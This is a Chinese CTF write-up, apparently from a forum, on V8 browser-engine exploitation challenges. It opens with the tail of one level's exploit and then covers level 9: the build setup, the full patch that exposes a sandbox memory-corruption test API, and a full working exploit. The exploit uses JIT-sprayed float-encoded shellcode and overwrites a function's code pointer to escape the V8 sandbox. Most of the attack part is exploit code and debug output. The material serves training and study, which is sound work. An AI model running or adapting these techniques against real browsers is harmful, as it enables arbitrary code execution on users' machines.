for(let i = 0; i< 40000; i++){
    shellcode();
}
 
var double_map_addr = 0x1cb7f9;
 
function addressOf(object){
    function oob_write(idx,object_){
        let victim_array = [1.1];
        let obj = [object_];
 
        // 这个运算可以影响对布局，但是原因未知
        idx= idx & 0xff;
 
        victim_array[idx] = lh_u32_to_f64(f64_to_u32l(victim_array[idx]),double_map_addr);
 
        return [victim_array,obj,object_];
    }
 
    for (let i = 0; i < 0x100000; i++) {
        oob_write(0,object);
    }
    let temp = oob_write(4,object);
    let oob_array = temp[1];
    // p(temp);
    // p(oob_array);
 
    return f64_to_u32l(oob_array[0]);
}
 
 
var shellcode_addr = addressOf(shellcode);
logg("shellcode_addr",shellcode_addr);
 
function AAR(addr){
 
    function oob_write(idx,addr_){
        for(let i=0; i < 1000000; i++);
        let victim_array = [1.1];
        idx= idx & 0xff;
 
        f64[0] = victim_array[idx];
        u32[0] = addr_;
        victim_array[idx] = f64[0];
        // victim_array[idx] = lh_u32_to_f64(addr_,0x1000);
        return victim_array;
    }
 
    for (let i = 0; i < 1000; i++) {
        oob_write(0,addr);
    }
    let temp = oob_write(0x2,addr-8);
    // p(temp);
    return f64_to_u64(temp[0]);
}
 
 
 
// p(shellcode);
var code_addr = u64_to_u32_lo(AAR(shellcode_addr+0xc));
var ins_base = AAR((code_addr)+0x14);
var offset = 0x7en
 
logg("code_addr",code_addr);
logg("ins_base",ins_base);
logg("rop_base",((ins_base)+offset));
 
function AAW(addr,val){
 
    function oob_write(idx,addr_){
        for(let i=0; i < 1000000; i++);
        let victim_array = [1.1];
        idx= idx & 0xff;
 
        f64[0] = victim_array[idx];
        u32[0] = addr_;
        victim_array[idx] = f64[0];
        // victim_array[idx] = lh_u32_to_f64(addr_,0x1000);
        return victim_array;
    }
 
    for (let i = 0; i < 1000; i++) {
        oob_write(0,addr);
    }
    let temp = oob_write(0x2,addr-8);
    temp[0] = u64_to_f64(val);
    // p(temp);
}
 
 
AAW(code_addr+0x14,(BigInt(ins_base)+offset))
 
// stop();
shellcode();
 
// spin();
```

> 环境太几把玄学了。

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_6tNFFRaeqj.png)

level-9
=======

环境搭建
----

> 漏洞分析里有完整的 patch 内容

```
git reset --hard f5e412a1cd82fb606b79a587f1c4bda7f9445701
gclient sync -D
git apply < ./patch
gn gen out/release
```

修改编译参数

```
➜  release git:(9.9.5) ✗ cat args.gn      
# Set build arguments here. See `gn help buildargs`.
dcheck_always_on = false
is_debug = false
is_component_build = false
target_cpu = "x64"
v8_enable_object_print = true
v8_enable_disassembler = true
v8_enable_backtrace = true                                                                                                                                              ➜  release git:(9.9.5) ✗
```

接着编译

```
autoninja -C out/release d8
```

漏洞分析
----

从编译参数里可以发现这次没有`v8_enable_sandbox = false`，因此是开启了沙箱

这个 patch 的内容其实是高版本 v8 引入的一个 api 的部分方法，主要用于测试沙箱逃逸的 api，开启之后相当于拥有了对于沙箱内地址任意修改的能力，最新版本的 api 功能可以查看 src/sandbox 目录下的源码。

这道题目开启了如下所示的四个方法

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_8CXcLuono7.png)

注释里是使用方法，这里返回了 sandbox 的大小

```
// Sandbox.byteLength
void SandboxGetByteLength(const v8::FunctionCallbackInfo& args) {
  v8::Isolate* isolate = args.GetIsolate();
  double sandbox_size = GetProcessWideSandbox()->size();
  args.GetReturnValue().Set(v8::Number::New(isolate, sandbox_size));
} 
```

这个方法提供了一个 [addr,addr+offset] 的内存任意读写的能力，但是范围限定在了沙箱内，从这段代码可以看出来`(offset > sandbox->size() || size > sandbox->size() || (offset + size) > sandbox->size())`

```
// new Sandbox.MemoryView(args) -> Sandbox.MemoryView
void SandboxMemoryView(const v8::FunctionCallbackInfo& args) {
  v8::Isolate* isolate = args.GetIsolate();
  Local context = isolate->GetCurrentContext();
 
  if (!args.IsConstructCall()) {
    isolate->ThrowError("Sandbox.MemoryView must be invoked with 'new'");
    return;
  }
 
  Local arg1, arg2;
  if (!args[0]->ToInteger(context).ToLocal(&arg1) ||
      !args[1]->ToInteger(context).ToLocal(&arg2)) {
    isolate->ThrowError("Expects two number arguments (start offset and size)");
    return;
  }
 
  Sandbox* sandbox = GetProcessWideSandbox();
  CHECK_LE(sandbox->size(), kMaxSafeIntegerUint64);
 
  uint64_t offset = arg1->Value();
  uint64_t size = arg2->Value();
  if (offset > sandbox->size() || size > sandbox->size() ||
      (offset + size) > sandbox->size()) {
    isolate->ThrowError(
        "The MemoryView must be entirely contained within the sandbox");
    return;
  }
 
  Factory* factory = reinterpret_cast(isolate)->factory();
  std::unique_ptr memory = BackingStore::WrapAllocation(
      reinterpret_cast(sandbox->base() + offset), size,
      v8::BackingStore::EmptyDeleter, nullptr, SharedFlag::kNotShared);
  if (!memory) {
    isolate->ThrowError("Out of memory: MemoryView backing store");
    return;
  }
  Handle buffer = factory->NewJSArrayBuffer(std::move(memory));
  args.GetReturnValue().Set(Utils::ToLocal(buffer));
} 
```

这个就是获取 obj 的地址

```
// Sandbox.getAddressOf(object) -> Number
void SandboxGetAddressOf(const v8::FunctionCallbackInfo& args) {
  v8::Isolate* isolate = args.GetIsolate();
 
  if (args.Length() == 0) {
    isolate->ThrowError("First argument must be provided");
    return;
  }
 
  Handle arg = Utils::OpenHandle(*args[0]);
  if (!arg->IsHeapObject()) {
    isolate->ThrowError("First argument must be a HeapObject");
    return;
  }
 
  // HeapObjects must be allocated inside the pointer compression cage so their
  // address relative to the start of the sandbox can be obtained simply by
  // taking the lowest 32 bits of the absolute address.
  uint32_t address = static_cast(HeapObject::cast(*arg).address());
  args.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, address));
} 
```

下面是获取 obj 的 size

```
// Sandbox.getSizeOf(object) -> Number
void SandboxGetSizeOf(const v8::FunctionCallbackInfo& args) {
  v8::Isolate* isolate = args.GetIsolate();
 
  if (args.Length() == 0) {
    isolate->ThrowError("First argument must be provided");
    return;
  }
 
  Handle arg = Utils::OpenHandle(*args[0]);
  if (!arg->IsHeapObject()) {
    isolate->ThrowError("First argument must be a HeapObject");
    return;
  }
 
  int size = HeapObject::cast(*arg).Size();
  args.GetReturnValue().Set(v8::Integer::New(isolate, size));
} 
```

完整的 patch 内容

```
diff --git a/BUILD.bazel b/BUILD.bazel
index 3d37f45cede..584701ef478 100644
--- a/BUILD.bazel
+++ b/BUILD.bazel
@@ -1921,6 +1921,8 @@ filegroup(
         "src/sandbox/external-pointer.h",
         "src/sandbox/external-pointer-table.cc",
         "src/sandbox/external-pointer-table.h",
+    "src/sandbox/testing.cc",
+    "src/sandbox/testing.h",
         "src/sandbox/sandbox.cc",
         "src/sandbox/sandbox.h",
         "src/sandbox/sandboxed-pointer-inl.h",
diff --git a/BUILD.gn b/BUILD.gn
index 7ef8c1f2e06..d0538db38c3 100644
--- a/BUILD.gn
+++ b/BUILD.gn
@@ -304,18 +304,18 @@ declare_args() {
  
   # Enable the experimental V8 sandbox.
   # Sets -DV8_SANDBOX.
-  v8_enable_sandbox = false
+  v8_enable_sandbox = true
  
   # Enable external pointer sandboxing. Requires v8_enable_sandbox.
   # Sets -DV8_SANDBOXED_EXTERNAL_POINRTERS.
-  v8_enable_sandboxed_external_pointers = false
+  v8_enable_sandboxed_external_pointers = true
  
   # Enable sandboxed pointers. Requires v8_enable_sandbox.
   # Sets -DV8_SANDBOXED_POINTERS.
-  v8_enable_sandboxed_pointers = false
+  v8_enable_sandboxed_pointers = true
  
   # Enable all available sandbox features. Implies v8_enable_sandbox.
-  v8_enable_sandbox_future = false
+  v8_enable_sandbox_future = true
  
   # Experimental feature for collecting per-class zone memory stats.
   # Requires use_rtti = true
@@ -3332,6 +3332,7 @@ v8_header_set("v8_internal_headers") {
     "src/sandbox/sandbox.h",
     "src/sandbox/sandboxed-pointer-inl.h",
     "src/sandbox/sandboxed-pointer.h",
+    "src/sandbox/testing.h",
     "src/snapshot/code-serializer.h",
     "src/snapshot/context-deserializer.h",
     "src/snapshot/context-serializer.h",
@@ -4353,6 +4354,7 @@ v8_source_set("v8_base_without_compiler") {
     "src/runtime/runtime.cc",
     "src/sandbox/external-pointer-table.cc",
     "src/sandbox/sandbox.cc",
+    "src/sandbox/testing.cc",
     "src/snapshot/code-serializer.cc",
     "src/snapshot/context-deserializer.cc",
     "src/snapshot/context-serializer.cc",
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index 050cbdc78df..061379666a8 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -2860,7 +2860,7 @@ Local Shell::CreateNodeTemplates(Isolate* isolate) {
  
 Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local global_template = ObjectTemplate::New(isolate);
-  global_template->Set(Symbol::GetToStringTag(isolate),
+/*  global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));
@@ -2877,13 +2877,13 @@ Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "readline",
                        FunctionTemplate::New(isolate, ReadLine));
   global_template->Set(isolate, "load",
-                       FunctionTemplate::New(isolate, ExecuteFile));
+                       FunctionTemplate::New(isolate, ExecuteFile));*/
   global_template->Set(isolate, "setTimeout",
                        FunctionTemplate::New(isolate, SetTimeout));
   // Some Emscripten-generated code tries to call 'quit', which in turn would
   // call C's exit(). This would lead to memory leaks, because there is no way
   // we can terminate cleanly then, so we need a way to hide 'quit'.
-  if (!options.omit_quit) {
+/*  if (!options.omit_quit) {
     global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
   }
   global_template->Set(isolate, "testRunner",
@@ -2909,7 +2909,7 @@ Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   if (i::FLAG_expose_async_hooks) {
     global_template->Set(isolate, "async_hooks",
                          Shell::CreateAsyncHookTemplate(isolate));
-  }
+  }*/
  
   return global_template;
 }
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index 16015435073..ecd1fbb4116 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -24,6 +24,7 @@
 #include "src/logging/runtime-call-stats-scope.h"
 #include "src/objects/instance-type.h"
 #include "src/objects/objects.h"
+#include "src/sandbox/testing.h"
 #ifdef ENABLE_VTUNE_TRACEMARK
 #include "src/extensions/vtunedomain-support-extension.h"
 #endif  // ENABLE_VTUNE_TRACEMARK
@@ -5694,6 +5695,10 @@ bool Genesis::InstallSpecialObjects(Isolate* isolate,
   }
 #endif  // V8_ENABLE_WEBASSEMBLY
  
+  if (GetProcessWideSandbox()->is_initialized()) {
+    MemoryCorruptionApi::Install(isolate);
+  }
+
   return true;
 }
  
diff --git a/src/sandbox/testing.cc b/src/sandbox/testing.cc
new file mode 100644
index 00000000000..327fd33588d
--- /dev/null
+++ b/src/sandbox/testing.cc
@@ -0,0 +1,194 @@
+// Copyright 2022 the V8 project authors. All rights reserved.
+// Use of this source code is governed by a BSD-style license that can be
+// found in the LICENSE file.
+
+#include "src/sandbox/testing.h"
+
+#include "src/api/api-inl.h"
+#include "src/api/api-natives.h"
+#include "src/common/globals.h"
+#include "src/execution/isolate-inl.h"
+#include "src/heap/factory.h"
+#include "src/objects/backing-store.h"
+#include "src/objects/js-objects.h"
+#include "src/objects/templates.h"
+#include "src/sandbox/sandbox.h"
+
+namespace v8 {
+namespace internal {
+
+//#ifdef V8_EXPOSE_MEMORY_CORRUPTION_API
+
+namespace {
+
+// Sandbox.byteLength
+void SandboxGetByteLength(const v8::FunctionCallbackInfo& args) {
+  v8::Isolate* isolate = args.GetIsolate();
+  double sandbox_size = GetProcessWideSandbox()->size();
+  args.GetReturnValue().Set(v8::Number::New(isolate, sandbox_size));
+}
+
+// new Sandbox.MemoryView(args) -> Sandbox.MemoryView
+void SandboxMemoryView(const v8::FunctionCallbackInfo& args) {
+  v8::Isolate* isolate = args.GetIsolate();
+  Local context = isolate->GetCurrentContext();
+
+  if (!args.IsConstructCall()) {
+    isolate->ThrowError("Sandbox.MemoryView must be invoked with 'new'");
+    return;
+  }
+
+  Local arg1, arg2;
+  if (!args[0]->ToInteger(context).ToLocal(&arg1) ||
+      !args[1]->ToInteger(context).ToLocal(&arg2)) {
+    isolate->ThrowError("Expects two number arguments (start offset and size)");
+    return;
+  }
+
+  Sandbox* sandbox = GetProcessWideSandbox();
+  CHECK_LE(sandbox->size(), kMaxSafeIntegerUint64);
+
+  uint64_t offset = arg1->Value();
+  uint64_t size = arg2->Value();
+  if (offset > sandbox->size() || size > sandbox->size() ||
+      (offset + size) > sandbox->size()) {
+    isolate->ThrowError(
+        "The MemoryView must be entirely contained within the sandbox");
+    return;
+  }
+
+  Factory* factory = reinterpret_cast(isolate)->factory();
+  std::unique_ptr memory = BackingStore::WrapAllocation(
+      reinterpret_cast(sandbox->base() + offset), size,
+      v8::BackingStore::EmptyDeleter, nullptr, SharedFlag::kNotShared);
+  if (!memory) {
+    isolate->ThrowError("Out of memory: MemoryView backing store");
+    return;
+  }
+  Handle buffer = factory->NewJSArrayBuffer(std::move(memory));
+  args.GetReturnValue().Set(Utils::ToLocal(buffer));
+}
+
+// Sandbox.getAddressOf(object) -> Number
+void SandboxGetAddressOf(const v8::FunctionCallbackInfo& args) {
+  v8::Isolate* isolate = args.GetIsolate();
+
+  if (args.Length() == 0) {
+    isolate->ThrowError("First argument must be provided");
+    return;
+  }
+
+  Handle arg = Utils::OpenHandle(*args[0]);
+  if (!arg->IsHeapObject()) {
+    isolate->ThrowError("First argument must be a HeapObject");
+    return;
+  }
+
+  // HeapObjects must be allocated inside the pointer compression cage so their
+  // address relative to the start of the sandbox can be obtained simply by
+  // taking the lowest 32 bits of the absolute address.
+  uint32_t address = static_cast(HeapObject::cast(*arg).address());
+  args.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, address));
+}
+
+// Sandbox.getSizeOf(object) -> Number
+void SandboxGetSizeOf(const v8::FunctionCallbackInfo& args) {
+  v8::Isolate* isolate = args.GetIsolate();
+
+  if (args.Length() == 0) {
+    isolate->ThrowError("First argument must be provided");
+    return;
+  }
+
+  Handle arg = Utils::OpenHandle(*args[0]);
+  if (!arg->IsHeapObject()) {
+    isolate->ThrowError("First argument must be a HeapObject");
+    return;
+  }
+
+  int size = HeapObject::cast(*arg).Size();
+  args.GetReturnValue().Set(v8::Integer::New(isolate, size));
+}
+
+Handle NewFunctionTemplate(
+    Isolate* isolate, FunctionCallback func,
+    ConstructorBehavior constructor_behavior) {
+  // Use the API functions here as they are more convenient to use.
+  v8::Isolate* api_isolate = reinterpret_cast(isolate);
+  Local function_template =
+      FunctionTemplate::New(api_isolate, func, {}, {}, 0, constructor_behavior,
+                            SideEffectType::kHasSideEffect);
+  return v8::Utils::OpenHandle(*function_template);
+}
+
+Handle CreateFunc(Isolate* isolate, FunctionCallback func,
+                              Handle name, bool is_constructor) {
+  ConstructorBehavior constructor_behavior = is_constructor
+                                                 ? ConstructorBehavior::kAllow
+                                                 : ConstructorBehavior::kThrow;
+  Handle function_template =
+      NewFunctionTemplate(isolate, func, constructor_behavior);
+  return ApiNatives::InstantiateFunction(function_template, name)
+      .ToHandleChecked();
+}
+
+void InstallFunc(Isolate* isolate, Handle holder,
+                 FunctionCallback func, const char* name, int num_parameters,
+                 bool is_constructor) {
+  Factory* factory = isolate->factory();
+  Handle function_name = factory->NewStringFromAsciiChecked(name);
+  Handle function =
+      CreateFunc(isolate, func, function_name, is_constructor);
+  function->shared().set_length(num_parameters);
+  JSObject::AddProperty(isolate, holder, function_name, function, NONE);
+}
+
+void InstallGetter(Isolate* isolate, Handle object,
+                   FunctionCallback func, const char* name) {
+  Factory* factory = isolate->factory();
+  Handle property_name = factory->NewStringFromAsciiChecked(name);
+  Handle getter = CreateFunc(isolate, func, property_name, false);
+  Handle setter = factory->null_value();
+  JSObject::DefineAccessor(object, property_name, getter, setter, FROZEN);
+}
+
+void InstallFunction(Isolate* isolate, Handle holder,
+                     FunctionCallback func, const char* name,
+                     int num_parameters) {
+  InstallFunc(isolate, holder, func, name, num_parameters, false);
+}
+
+void InstallConstructor(Isolate* isolate, Handle holder,
+                        FunctionCallback func, const char* name,
+                        int num_parameters) {
+  InstallFunc(isolate, holder, func, name, num_parameters, true);
+}
+
+}  // namespace
+
+// static
+void MemoryCorruptionApi::Install(Isolate* isolate) {
+  CHECK(GetProcessWideSandbox()->is_initialized());
+
+  Factory* factory = isolate->factory();
+
+  // Create the special Sandbox object that provides read/write access to the
+  // sandbox address space alongside other miscellaneous functionality.
+  Handle sandbox =
+      factory->NewJSObject(isolate->object_function(), AllocationType::kOld);
+
+  InstallGetter(isolate, sandbox, SandboxGetByteLength, "byteLength");
+  InstallConstructor(isolate, sandbox, SandboxMemoryView, "MemoryView", 2);
+  InstallFunction(isolate, sandbox, SandboxGetAddressOf, "getAddressOf", 1);
+  InstallFunction(isolate, sandbox, SandboxGetSizeOf, "getSizeOf", 1);
+
+  // Install the Sandbox object as property on the global object.
+  Handle global = isolate->global_object();
+  Handle name = factory->NewStringFromAsciiChecked("Sandbox");
+  JSObject::AddProperty(isolate, global, name, sandbox, DONT_ENUM);
+}
+
+//#endif  // V8_EXPOSE_MEMORY_CORRUPTION_API
+
+}  // namespace internal
+}  // namespace v8
diff --git a/src/sandbox/testing.h b/src/sandbox/testing.h
new file mode 100644
index 00000000000..0c30397c3c5
--- /dev/null
+++ b/src/sandbox/testing.h
@@ -0,0 +1,28 @@
+// Copyright 2022 the V8 project authors. All rights reserved.
+// Use of this source code is governed by a BSD-style license that can be
+// found in the LICENSE file.
+
+#ifndef V8_SANDBOX_TESTING_H_
+#define V8_SANDBOX_TESTING_H_
+
+#include "src/common/globals.h"
+
+namespace v8 {
+namespace internal {
+
+//#ifdef V8_EXPOSE_MEMORY_CORRUPTION_API
+// A JavaScript API that emulates typical exploit primitives.
+//
+// This can be used for testing the sandbox, for example to write regression
+// tests for bugs in the sandbox or to develop fuzzers.
+class MemoryCorruptionApi {
+ public:
+  V8_EXPORT_PRIVATE static void Install(Isolate* isolate);
+};
+
+//#endif  // V8_EXPOSE_MEMORY_CORRUPTION_API
+
+}  // namespace internal
+}  // namespace v8
+
+#endif  // V8_SANDBOX_TESTING_H_ 
```

漏洞利用
----

这里已经具有了沙箱内任意读写的能力，所以也不需要再构造 addressOf 和 fakeObject 原语，现在需要思考的应该是如何成功地沙箱逃逸

一个技巧是通过这个办法构造越界读写原语，这样可以调用 DataView 的方法去直接 4/8 字节操作内存

```
var mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));
```

还是可以采用立即数 shellcode，配合 JIT Spray 实现沙箱逃逸

对于这样一段代码

```
function stop(){
    %SystemBreak();
}
 
function p(arg){
    %DebugPrint(arg);
}
 
// catflag
const shellcode = () => {return [
    1.0,
    1.9710255944286777e-246,
    1.971136949489835e-246,
    1.97118242283721e-246,
    1.9711826272864685e-246,
    1.9712937950614383e-246,
    -1.6956275879669133e-231
];}
 
for(let i = 0; i< 40000; i++){
    shellcode();
}
 
p(shellcode);
stop();
shellcode();
```

输出如下

```
DebugPrint: 0x1d8308343625: [Function] in OldSpace
 - map: 0x1d83082022c1 [FastProperties]
 - prototype: 0x1d83081c2861 - elements: 0x1d8308002249 [HOLEY_ELEMENTS]
 - function prototype: - shared_info: 0x1d83081d1b31 - name: 0x1d83081d18b1 - builtin: InterpreterEntryTrampoline
 - formal_parameter_count: 0
 - kind: ArrowFunction
 - context: 0x1d83081d1d19 - code: 0x1d8300004e81 `- interpreted
 - bytecode: 0x1d83081d1fe1 - source code: () => {return [
    1.0,
    1.9710255944286777e-246,
    1.971136949489835e-246,
    1.97118242283721e-246,
    1.9711826272864685e-246,
    1.9712937950614383e-246,
    -1.6956275879669133e-231
];}
 - properties: 0x1d8308002249 - All own properties (excluding elements): {
    0x1d8308004cc9: [String] in ReadOnlySpace: #length: 0x1d8308144449 (const accessor descriptor), location: descriptor
    0x1d8308004f11: [String] in ReadOnlySpace: #name: 0x1d8308144405 (const accessor descriptor), location: descriptor
 }
 - feedback vector: 0x1d83081d2019: [FeedbackVector] in OldSpace
 - map: 0x1d830800272d - length: 1
 - shared function info: 0x1d83081d1b31 - no optimized code
 - optimization marker: OptimizationMarker::kNone
 - optimization tier: OptimizationTier::kNone
 - invocation count: 21658
 - profiler ticks: 0
 - closure feedback cell array: 0x1d83080033e9: [ClosureFeedbackCellArray] in ReadOnlySpace
 - map: 0x1d8308002971 - length: 0
 
 - slot #0 Literal  {
     [0]: 0x1d83081d20d5 }
0x1d83082022c1: [Map]
 - type: JS_FUNCTION_TYPE
 - instance size: 28
 - inobject properties: 0
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - callable
 - back pointer: 0x1d83080023d1 - prototype_validity cell: 0x1d8308144515 - instance descriptors (own) #2: 0x1d83081c295d - prototype: 0x1d83081c2861 - constructor: 0x1d8308002251 - dependent code: 0x1d83080021d1 - construction counter: 0` 
```

这里只需要修改 code 字段，就可以劫持控制流，这里修改成 0x41414141，gdb 里执行`set {int}0x1d830834363c=0x4141414141` ，执行发现此时的 RCX=R14+0x41414141，意味着我们可以劫持 rip 具体值，通过修改 code 字段

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_k3sXvEr1DU.png)

注意下方的汇编，提取出来是这样。这里只要劫持 rcx 的值就是任意指令执行，需要执行的指令位于 rcx+0x3f，同时需要绕过条件`[rcx+0x1b] & 0x20000000 = 0`

```
@rcx = r14 = sandbox base
test   dword ptr [rcx + 0x1b], 0x20000000
jne    0x1d8307e82081
add    rcx, 0x3f 
jmp    rcx
```

绕过`dword ptr [rcx + 0x1b], 0x20000000`的方法，shellcode 最前面加一个 1.0 就可以，

```
// catflag
const shellcode = () => {return [
    1.0,
    1.9710255944286777e-246,
    1.971136949489835e-246,
    1.97118242283721e-246,
    1.9711826272864685e-246,
    1.9712937950614383e-246,
    -1.6956275879669133e-231
];}
```

然后后面就是修改 code 为我们 shellcode 位于的位置 - 0x3f

exp
---

```
var buf = new ArrayBuffer(8);
var f32 = new Float32Array(buf);
var f64 = new Float64Array(buf);
var u8 = new Uint8Array(buf);
var u16 = new Uint16Array(buf);
var u32 = new Uint32Array(buf);
var u64 = new BigUint64Array(buf);
 
function lh_u32_to_f64(l,h){
    u32[0] = l;
    u32[1] = h;
    return f64[0];
}
function f64_to_u32l(val){
    f64[0] = val;
    return u32[0];
}
function f64_to_u32h(val){
    f64[0] = val;
    return u32[1];
}
function f64_to_u64(val){
    f64[0] = val;
    return u64[0];
}
function u64_to_f64(val){
    u64[0] = val;
    return f64[0];
}
 
function u64_to_u32_lo(val){
    u64[0] = val;
    return u32[0];
}
 
function u64_to_u32_hi(val){
    u64[0] = val;
    return u32[1];
}
 
 
// function stop(){
//     %SystemBreak();
// }
 
// function p(arg){
//     %DebugPrint(arg);
// }
 
function spin(){
    while(1){};
}
 
function hex(str){
    return str.toString(16).padStart(16,0);
}
 
function logg(str,val){
    console.log("[+] "+ str + ": " + "0x" + hex(val));
}
 
 
var mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));
 
function addressOf(obj){
    return Sandbox.getAddressOf(obj);
}
 
function AAR(addr){
    return mem.getUint32(addr, true);
}
function AAW(addr,val){
    mem.setUint32(addr, val, true);
}
 
const shellcode = () => {return [
    1.0,
    1.9710255944286777e-246,
    1.971136949489835e-246,
    1.97118242283721e-246,
    1.9711826272864685e-246,
    1.9712937950614383e-246,
    -1.6956275879669133e-231
];}
 
for(let i = 0; i< 40000; i++){
    shellcode();
}
 
// p(shellcode);
 
var shellcode_addr = addressOf(shellcode);
var code_addr = AAR(shellcode_addr+0x18);
var ins_base = code_addr+0xb3-0x3f;
AAW(shellcode_addr+0x18,ins_base);
 
logg("shellcode_addr",shellcode_addr);
logg("code_addr",code_addr);
logg("ins_base",ins_base);
 
// stop();
shellcode();
 
// spin();
```

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_Ktp4oX7D2W.png)

  

[[培训] 内核驱动高级班，冲击 BAT 一流互联网大厂工作，每周日 13:00-18:00 直播授课](https://www.kanxue.com/book-section_list-173.htm)

[#基础知识](forum-171-1-180.htm) [#漏洞机制](forum-171-1-181.htm) [#浏览器相关](forum-171-1-184.htm) [#题解集锦](forum-171-1-187.htm)